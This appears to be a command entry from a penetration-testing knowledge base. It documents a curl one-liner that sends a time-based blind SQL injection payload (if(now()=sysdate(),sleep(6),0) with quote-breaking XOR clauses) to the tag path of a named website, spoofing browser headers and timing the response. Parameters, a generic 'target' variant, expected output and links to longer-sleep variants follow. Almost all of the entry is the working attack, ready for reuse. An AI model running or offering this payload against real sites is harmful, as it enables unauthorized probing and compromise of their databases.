---
data: >-
  curl -s -w "%{time_total}s"
  "https://betterscience.org/plugin/tag/if(now()%3dsysdate()%2csleep(6)%2c0)/%2a'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22%2f*"
  -H "Host: betterscience.org" -H "Cookie: [session cookies]" -H "Referer:
  https://betterscience.org/" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1;
  WOW64)..." -H "X-Requested-With: XMLHttpRequest" > /dev/null
tags:
  - sqli
  - scalability
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:14.881Z'
id: b6d623b5-a8d6-48da-ab1d-81dda7e4e0a6
verified: false
validated: true
submitted: true
---
# curl-sqli-payload-sleep-6

## Command

```bash
curl -s -w "%{time_total}s" "https://betterscience.org/plugin/tag/if(now()%3dsysdate()%2csleep(6)%2c0)/%2a'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22%2f*" -H "Host: betterscience.org" -H "Cookie: [session cookies]" -H "Referer: https://betterscience.org/" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64)..." -H "X-Requested-With: XMLHttpRequest" > /dev/null
```

## Description

Injects 6-second sleep for delay scaling test.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent | Yes |
| `-w` | Time | Yes |
| URL | Encoded sleep(6) | Yes |
| Headers | Browser mimic | Yes |

## Examples

### Basic Usage

```bash
curl -s -w "%{time_total}s" "https://target/plugin/tag/[sleep6-payload]" > /dev/null
```

## Expected Output

~6.272s delay.

## Related

- [[commands/curl-sqli-payload-sleep-9]]
- [[procedures/Scale-Delay-with-Longer-Sleep-Times]]
